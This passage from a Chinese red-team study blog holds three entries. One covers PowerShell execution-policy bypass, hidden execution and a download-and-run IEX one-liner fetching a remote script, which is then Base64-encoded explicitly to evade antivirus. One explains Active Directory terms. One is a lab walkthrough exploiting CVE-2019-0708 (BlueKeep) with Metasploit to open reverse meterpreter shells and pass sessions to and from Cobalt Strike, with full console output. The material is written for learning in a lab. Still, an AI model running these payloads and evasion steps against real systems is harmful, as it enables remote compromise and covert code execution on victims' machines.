中的 about_Execution_Policies。    + CategoryInfo          : SecurityError: (:) []，ParentContainsErrorRecordException    + FullyQualifiedErrorId : UnauthorizedAccess<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里系统会提示在此系统上禁止运行脚本，但加上 <code>-ExecutionPolicy Bypass</code>即可绕过这个限制</p><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix&gt; cat .\t.ps1echo &quot;Hello TeamsSix&quot;PS C:\Users\teamssix&gt; PowerShell.exe -ExecutionPolicy Bypass -File t.ps1hello TeamsSix<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="绕过本地权限并隐藏执行"><a href="#绕过本地权限并隐藏执行" class="headerlink" title="绕过本地权限并隐藏执行"></a>绕过本地权限并隐藏执行</h3><p>加入<code>-WindowStyle Hidden -NoLogo -NonInteractive -NoProfile</code> 即可隐藏执行。</p><pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -File t.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="下载远程脚本绕过权限并隐藏执行"><a href="#下载远程脚本绕过权限并隐藏执行" class="headerlink" title="下载远程脚本绕过权限并隐藏执行"></a>下载远程脚本绕过权限并隐藏执行</h3><pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;172.16.214.1:8000&#x2F;t.ps1&#39;)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者简写</p><pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -Exec Bypass -W Hidden -NoLogo -NonI -NoP &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;172.16.214.1:8000&#x2F;t.ps1&#39;)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="利用-Base64-对命令进行编码"><a href="#利用-Base64-对命令进行编码" class="headerlink" title="利用 Base64 对命令进行编码"></a>利用 Base64 对命令进行编码</h3><p>使用 Base64 进行编码主要是为了混淆代码以避免被杀毒软件查杀，经过尝试这里直接使用 Base64 编码是不行的，可以使用 Github 上的一个编码工具，工具下载地址：</p><p><a href="https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py">https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py</a></p><p>下载好后，需要先将要执行的命令保存到文本文件中，这里保存到了 tmp.txt 文本中，之后执行 <code>python ps_encoder.py -s tmp.txt</code> 即可</p><pre class="line-numbers language-none"><code class="language-none">&gt;cat tmp.txtIEX(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;172.16.214.1:8000&#x2F;t.ps1&#39;)&gt;python ps_encoder.py -s tmp.txtSQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgAxADQALgAxADoAOAAwADAAMAAvAHQALgBwAHMAMQAnACkA<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用 –Enc 指定 Base64 编码内容</p><pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgAxADQALgAxADoAOAAwADAAMAAvAHQALgBwAHMAMQAnACkA<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-02-06_18-40-25.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>参考链接：</p><p><a href="https://www.jianshu.com/p/c8f5c374466a">https://www.jianshu.com/p/c8f5c374466a</a></p><p><a href="https://www.cnblogs.com/frendguo/p/11761693.html">https://www.cnblogs.com/frendguo/p/11761693.html</a></p><p><a href="https://www.cnblogs.com/lavender000/p/6931405.html">https://www.cnblogs.com/lavender000/p/6931405.html</a></p><p><a href="https://www.cnblogs.com/coderge/articles/13768824.html">https://www.cnblogs.com/coderge/articles/13768824.html</a></p><p><a href="https://baike.baidu.com/item/Windows%20Power%20Shell">https://baike.baidu.com/item/Windows%20Power%20Shell</a></p><p><a href="https://blog.csdn.net/weixin_45116657/article/details/103449931">https://blog.csdn.net/weixin_45116657/article/details/103449931</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】1、内网中常见名词解释</title>
      <link href="//210203-192358.html"/>
      <url>//210203-192358.html</url>
      
        <content type="html"><![CDATA[<h2 id="1、工作组"><a href="#1、工作组" class="headerlink" title="1、工作组"></a>1、工作组</h2><p><strong>工作组</strong> <code>Work Group</code> 是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。</p><p>比如在一个网络内，可能有成百上千台工作电脑，如果这些电脑不进行分组，都列在“网上邻居”内，可想而知会有多么乱。</p><p>为了解决这一问题，Windows 9x/NT/2000 引用了“工作组”这个概念，比如一所高校，会分为诸如数学系、中文系之类的，然后数学系的电脑全都列入数学系的工作组中，中文系的电脑全部都列入到中文系的工作组中……如果你要访问某个系别的资源，就在“网上邻居”里找到那个系的工作组名，双击就可以看到那个系别的电脑了。</p><p>在工作组中所有的计算机都是平等的，没有管理与被管理之分，因此工作组网络也称为对等网络。</p><p>所以对于管理者而言，工作组的管理方式有时会不太便于管理，这时候就需要了解域的概念了。</p><h2 id="2、域"><a href="#2、域" class="headerlink" title="2、域"></a>2、域</h2><h3 id="域-Domain"><a href="#域-Domain" class="headerlink" title="域 Domain"></a>域 <code>Domain</code></h3><p> 可以简单的理解成工作组的升级版，如果说工作组是“免费旅店”那么域就是“星级宾馆”；工作组可以随便进进出出，而域则有严格的控制。</p><p>在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为域控制器。</p><h3 id="域控制器-Domain-Controller"><a href="#域控制器-Domain-Controller" class="headerlink" title="域控制器 Domain Controller"></a>域控制器 <code>Domain Controller</code></h3><p>简写为 <code>DC</code>，域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。</p><p>当电脑连入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确的，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，这样就在一定程度上保护了网络上的资源。</p><p>正是因为域控起到了一个身份验证的作用，因此站在渗透的角度来说，拿下域控是至关重要的。拿下了域控，就相当于拿到了整个域内所有计算机的账号和密码。</p><p>而要想实现域环境，就必须要计算机中安装活动目录，也可以说如果在内网中的一台计算机上安装了活动目录，那它就变成了域控制器。在域中除了域控制器还有成员服务器、客户机、独立服务器。</p><h3 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h3><p>顾名思义，在一个域下新建了一个域便称其为子域。形象的来说，一个部门一个域，那个如果这个部门还有分部，那每个分部就可被称为子域，这个大的部门便称为父域。每个域中都有独立的安全策略。</p><h3 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h3><p>域树由多个域组成，这些域共享同一表结构和配置，形成一个连续的名字空间。</p><p>树中的域通过信任关系连接起来，活动目录包含一个或多个域树。域树中的域层次越深级别越低，一个“.”代表一个层次，如域child.Microsoft.com 就比 Microsoft.com这个域级别低，因为它有两个层次关系，而Microsoft.com只有一个层次。</p><p>而域Grandchild.Child.Microsoft.com又比 Child.Microsoft.com级别低，道理一样。他们都属于同一个域树。Child.Microsoft.com就属于Microsoft.com的子域。</p><p>多个域树可以组成一个域林。</p><h3 id="域林"><a href="#域林" class="headerlink" title="域林"></a>域林</h3><p>域林是指由一个或多个没有形成连续名字空间的域树组成，它与域树最明显的区别就在于域林之间没有形成连续的名字空间，而域树则是由一些具有连续名字空间的域组成。</p><p>但域林中的所有域树仍共享同一个表结构、配置和全局目录。域林中的所有域树通过Kerberos 信任关系建立起来，所以每个域树都知道Kerberos信任关系，不同域树可以交叉引用其他域树中的对象。域林都有根域，域林的根域是域林中创建的第一个域，域林中所有域树的根域与域林的根域建立可传递的信任关系.</p><p>比如benet.com.cn,则可以创建同属与一个林的accp.com.cn,他们就在同一个域林里.</p><p>当创建第一个域控制器的时候，就创建了第一个域（也称林根域），和第一个林。</p><p>林，是一个或多个共享公共架构和全局编录的域组成，每个域都有单独的安全策略，和与其他域的信任关系。一个单位可以有多个林。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/%E5%9F%9F%E6%9E%97.png" alt="域林"></p><h2 id="3、活动目录"><a href="#3、活动目录" class="headerlink" title="3、活动目录"></a>3、活动目录</h2><p><strong>活动目录</strong> <code>Active Directory</code> ，简写为 <code>AD</code>，它是 Windows Server 中负责架构中大型网络环境的集中式目录管理服务，在Windows 2000 Server 开始内置于 Windows Server 产品中。</p><p>目录包含了有关各种对象，例如用户、用户组、计算机、域、组织单位（OU）以及安全策略的信息。目录存储在域控上，并且可以被网络应用程序或者服务所访问。</p><p>活动目录就相当于内网中各种资源的一个目录，通过活动目录用户可以快速定位到这些资源的位置。</p><h2 id="4、DMZ"><a href="#4、DMZ" class="headerlink" title="4、DMZ"></a>4、DMZ</h2><p>DMZ <code>demilitarized zone</code> ，中文名为“隔离区”，或称“非军事化区”。它是为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，从而设立的一个非安全系统与安全系统之间的缓冲区。</p><p>DMZ 区可以理解为一个不同于外网或内网的特殊网络区域，DMZ 内通常放置一些不含机密信息的公用服务器，比如 WEB 服务器、E-Mail 服务器、FTP 服务器等。这样来自外网的访问者只可以访问 DMZ 中的服务，但不可能接触到存放在内网中的信息等，即使 DMZ 中服务器受到破坏，也不会对内网中的信息造成影响。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/f603918fa0ec08fadb43804a59ee3d6d54fbda98.jfif?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="5、域内的各种权限"><a href="#5、域内的各种权限" class="headerlink" title="5、域内的各种权限"></a>5、域内的各种权限</h2><p>首先要理解一下组的概念，在组里包含了很多用户，当管理员想要给某个用户分配权限时，只需要将用户加入到对应权限的组里就行，从而提高了管理效率，常见的组有：域本地组、全局组、通用组。</p><p><strong>域本地组</strong></p><p>成员范围：所有的域；使用范围：自己所在的域</p><p><strong>全局组</strong></p><p>成员范围：自己所在的域；使用范围：所有的域</p><p><strong>通用组</strong></p><p>成员范围：所有的域；使用范围：所有的域</p><p><strong>A-G-DL-P 策略</strong></p><p>A-G-DL-P 策略是将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。</p><ul><li>A 表示用户账号</li><li>G 表示全局组</li><li>U 表示通用组</li><li>DL 表示域本地组</li><li>P 表示资源权限</li></ul><blockquote><p>参考链接：</p><p><a href="https://baike.baidu.com/item/DMZ">https://baike.baidu.com/item/DMZ</a></p><p><a href="https://baike.baidu.com/item/AGDLP">https://baike.baidu.com/item/AGDLP</a></p><p><a href="https://zh.wikipedia.org/wiki/Active_Directory">https://zh.wikipedia.org/wiki/Active_Directory</a></p><p><a href="https://baike.baidu.com/item/Windows%E5%9F%9F">https://baike.baidu.com/item/Windows%E5%9F%9F</a></p><p><a href="https://baike.baidu.com/item/%E5%9F%9F%E6%A0%91">https://baike.baidu.com/item/%E5%9F%9F%E6%A0%91</a></p><p><a href="https://baike.baidu.com/item/%E5%9F%9F%E6%9E%97">https://baike.baidu.com/item/%E5%9F%9F%E6%9E%97</a></p><p><a href="https://baike.baidu.com/item/%E5%B7%A5%E4%BD%9C%E7%BB%84">https://baike.baidu.com/item/%E5%B7%A5%E4%BD%9C%E7%BB%84</a></p><p><a href="https://baike.baidu.com/item/%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95">https://baike.baidu.com/item/%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【经验总结】CS与MSF之间的会话传递</title>
      <link href="//210129-191714.html"/>
      <url>//210129-191714.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>众所周知，Cobalt Strike 的前身是 Armitage，而 Armitage 又可以理解为 Metasploit  Framework 的图形界面版，因此 Cobalt Strike 与 Metasploit  Framework 在很多地方都是兼容的，所以我们便可以将 Metasploit  Framework 攻击产生的会话传递到 Cobalt Strike 上，同样的 Cobalt Strike 的会话也能够传递到 Metasploit  Framework</p><p><strong>Metasploit  Framework 会话传递到 Cobalt Strike 上整体过程如下：</strong></p><p>1、Metasploit Framework 调用攻击载荷，这里调用的是喜闻乐见的 CVE-2019-0708</p><p>2、Metasploit Framework 发起攻击，获取会话</p><p>3、Cobalt Strike 新建一个 Beacon，这里使用的是 HTTPS Beacon</p><p>4、最后，在 Metasploit Framework 上调用 exploit/windows/local/payload_inject 模块</p><p>5、在该模块上配置与 Cobalt Strike 上为同样类型的 payload，即 HTTPS Payload，设置 Cobalt Strike 服务器的 IP 和 端口后运行即可</p><p><strong>Cobalt Strike 会话传递到 Metasploit  Framework 上整体过程如下：</strong></p><p>1、首先，Cobalt Strike 需要获得一个会话，这里直接采用 Scripted Web Delivery（S）的方式使靶机上线</p><p>2、接着，Metasploit Framework 调用 exploit/multi/handler 模块</p><p>3、在该模块上配置 HTTP Payload，为该 payload 的 IP 和 端口设置成 Metasploit Framework 所在主机 IP，端口自定义即可</p><p>4、 之后运行该模块</p><p>5、在 Cobalt Strike 上创建一个 Foreign HTTP 的监听，监听 IP 和端口设置成刚才 Metasploit Framework 上所监听的 IP 和端口</p><p>7、接着在 Cobalt Strike 上右击选择要传递的会话，找到 Spawn 选项，选择刚刚创建的监听器即可</p><blockquote><p>环境信息：</p><p>攻击 IP：192.168.175.200 （Cobalt Strike 服务端、Metasploit Framework 所在主机）</p><p>靶机 IP：192.168.175.177 （一台有 CVE-2019-0708 漏洞的 Win7 SP1 64 位靶机）</p></blockquote><h1 id="0x01-Metasploit-Framework-会话传递到-Cobalt-Strike"><a href="#0x01-Metasploit-Framework-会话传递到-Cobalt-Strike" class="headerlink" title="0x01 Metasploit Framework 会话传递到 Cobalt Strike"></a>0x01 Metasploit Framework 会话传递到 Cobalt Strike</h1><h2 id="1、Cobalt-Strike-上的操作"><a href="#1、Cobalt-Strike-上的操作" class="headerlink" title="1、Cobalt Strike 上的操作"></a>1、Cobalt Strike 上的操作</h2><p>首先来到 Cobalt Strike 目录下，启动 Cobalt Strike 服务端</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;teamserver yourip yourpassword<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后打开 Cobalt Strike 客户端进行连接</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;start.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入服务端密码连接上之后，点击 Cobalt Strike –&gt; Listeners 打开 Listeners 界面，点击下方的 Add 按钮，输入 Beacon 名称，这里选择的是 HTTPS Beacon，添加上主机 IP，点击保存，即可创建一个 HTTPS Beacon</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-24_20-07-57.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="2、Metasploit-Framework-上的操作"><a href="#2、Metasploit-Framework-上的操作" class="headerlink" title="2、Metasploit Framework 上的操作"></a>2、Metasploit Framework 上的操作</h2><p>首先，打开 Metasploit Framework</p><pre class="line-numbers language-none"><code class="language-none">msfconsole <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>调用 CVE-2019-0708 模块</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置靶机 IP</p><pre class="line-numbers language-none"><code class="language-none">set rhost 192.168.175.177<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置 Payload</p><pre class="line-numbers language-none"><code class="language-none">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcpset lhost 192.168.175.200<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>发起攻击</p><pre class="line-numbers language-none"><code class="language-none">exploit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>整体过程如下：</p><pre class="line-numbers language-none"><code class="language-none">root@kali:~# msfconsolemsf5 &gt; use exploit&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rcemsf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set rhost 192.168.175.177rhost &#x3D;&gt; 192.168.175.177msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcppayload &#x3D;&gt; windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcpmsf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set lhost 192.168.175.200lhost &#x3D;&gt; 192.168.175.200msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; exploit[*] Started reverse TCP handler on 192.168.175.200:4444 [*] 192.168.175.177:3389 - Using auxiliary&#x2F;scanner&#x2F;rdp&#x2F;cve_2019_0708_bluekeep as check[+] 192.168.175.177:3389  - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.[*] 192.168.175.177:3389  - Scanned 1 of 1 hosts (100% complete)[*] 192.168.175.177:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8028608000, Channel count 1.[!] 192.168.175.177:3389 - &lt;---------------- | Entering Danger Zone | ----------------&gt;[*] 192.168.175.177:3389 - Surfing channels ...[*] 192.168.175.177:3389 - Lobbing eggs ...[*] 192.168.175.177:3389 - Forcing the USE of FREE&#39;d object ...[!] 192.168.175.177:3389 - &lt;---------------- | Leaving Danger Zone | ----------------&gt;[*] Sending stage (206403 bytes) to 192.168.175.177[*] Meterpreter session 4 opened (192.168.175.200:4444 -&gt; 192.168.175.177:49167) at 2020-07-26 05:57:22 -0400meterpreter &gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_17-57-47.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="3、开始传递会话"><a href="#3、开始传递会话" class="headerlink" title="3、开始传递会话"></a>3、开始传递会话</h2><p>首先，backgroud 会话</p><pre class="line-numbers language-none"><code class="language-none">background<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>调用 payload_inject 模块</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置 HTTPS Payload</p><pre class="line-numbers language-none"><code class="language-none">set payload windows&#x2F;meterpreter&#x2F;reverse_https<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置 lhost 和 lport 为 Cobalt Strike 的监听 IP 与端口</p><pre class="line-numbers language-none"><code class="language-none">set lhost 192.168.175.200set lport 443<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>设置 DisablePayloadHandler 为 True，此选项会让 Metasploit Framework 避免在其内起一个 handler 来服务你的 payload 连接，也就是告诉 Metasploit Framework 说我们已经建立了监听器，不必再新建监听器了。</p><pre class="line-numbers language-none"><code class="language-none">set DisablePayloadHandler True<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（可选）设置 PrependMigrate 为 True，此选项让 Metasploit Framework 前置 shellcode 在另一个进程中运行 payload stager，如果被利用的应用程序崩溃或被用户关闭，这会帮助 Beacon 会话存活。</p><pre class="line-numbers language-none"><code class="language-none">set PrependMigrate True<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置要传递的会话 session，如果不知道自己的 session id，可以通过 sessions -l 查看，我这里待传递的 session id 为 4</p><pre class="line-numbers language-none"><code class="language-none">set session 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开始会话传递</p><pre class="line-numbers language-none"><code class="language-none">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>整体过程如下：</p><pre class="line-numbers language-none"><code class="language-none">msf5 &gt; background [*] Backgrounding session 4...msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; use exploit&#x2F;windows&#x2F;local&#x2F;payload_injectmsf5 exploit(windows&#x2F;local&#x2F;payload_inject) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_httpspayload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_httpsmsf5 exploit(windows&#x2F;local&#x2F;payload_inject) &gt; set lhost 192.168.175.200lhost &#x3D;&gt; 192.168.175.200msf5 exploit(windows&#x2F;local&#x2F;payload_inject) &gt; set lport 443lport &#x3D;&gt; 443msf5 exploit(windows&#x2F;local&#x2F;payload_inject) &gt; set DisablePayloadHandler TrueDisablePayloadHandler &#x3D;&gt; truemsf5 exploit(windows&#x2F;local&#x2F;payload_inject) &gt; set PrependMigrate TruePrependMigrate &#x3D;&gt; Truemsf5 exploit(windows&#x2F;local&#x2F;payload_inject) &gt;  set session 4session &#x3D;&gt; 4msf5 exploit(windows&#x2F;local&#x2F;payload_inject) &gt; run[*] Running module against WIN-T0UES7KBMJ5[*] Spawned Notepad process 544[*] Injecting payload into 544[*] Preparing &#39;windows&#x2F;meterpreter&#x2F;reverse_https&#39; for PID 544<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_19-11-30.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>此时，来到 Cobalt Strike 下已经可以看到传递过来的会话了</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-08-39.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x02-Cobalt-Strike-会话传递到-Metasploit-Framework"><a href="#0x02-Cobalt-Strike-会话传递到-Metasploit-Framework" class="headerlink" title="0x02 Cobalt Strike 会话传递到 Metasploit Framework"></a>0x02 Cobalt Strike 会话传递到 Metasploit Framework</h1><h2 id="1、Cobalt-Strike-上的操作-1"><a href="#1、Cobalt-Strike-上的操作-1" class="headerlink" title="1、Cobalt Strike 上的操作"></a>1、Cobalt Strike 上的操作</h2><p>与上述 Cobalt Strike 的操作步骤一样，这里先创建一个 HTTPS Beacon，接下来创建一个 Powershell 类型的 Scripted Web Delivery（S）</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-27-02.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10">为了使 Cobalt Strike 获得一个会话，需要复制创建好的命令，并在靶机上运行，此时靶机便会上线了</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-30-31.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="2、Metasploit-Framework-上的操作-1"><a href="#2、Metasploit-Framework-上的操作-1" class="headerlink" title="2、Metasploit Framework 上的操作"></a>2、Metasploit Framework 上的操作</h2><p>首先，在 Metasploit Framework 上调用 handler 模块</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handler<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置 HTTP Payload</p><pre class="line-numbers language-none"><code class="language-none">set payload windows&#x2F;meterpreter&#x2F;reverse_httpset lhost 192.168.175.200set lport 4480<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>运行该模块</p><pre class="line-numbers language-none"><code class="language-none">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>整体过程如下：</p><pre class="line-numbers language-none"><code class="language-none">msf5 &gt; use exploit&#x2F;multi&#x2F;handlermsf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_httppayload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_httpmsf5 exploit(multi&#x2F;handler) &gt; set lhost 192.168.175.200lhost &#x3D;&gt; 192.168.175.200msf5 exploit(multi&#x2F;handler) &gt; set lport 4480lport &#x3D;&gt; 4480msf5 exploit(multi&#x2F;handler) &gt; run[*] Started HTTPS reverse handler on http:&#x2F;&#x2F;192.168.175.200:4480<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3、开始会话传递"><a href="#3、开始会话传递" class="headerlink" title="3、开始会话传递"></a><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-35-45.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10">3、开始会话传递</h2><p>在 Cobalt Strike 上先创建一个  Foreign HTTP 监听，IP 和 端口设置成上面 Metasploit Framework 所设置 handler 模块的端口和 IP</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-39-58.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>之后在 Cobalt Strike 上右击待传递的会话选择 Spawn ，选择刚刚创建的 Foreign HTTP 监听</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-54-23.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>来到 Metasploit Framework 便能够看到会话已经传递过来了</p><p><img 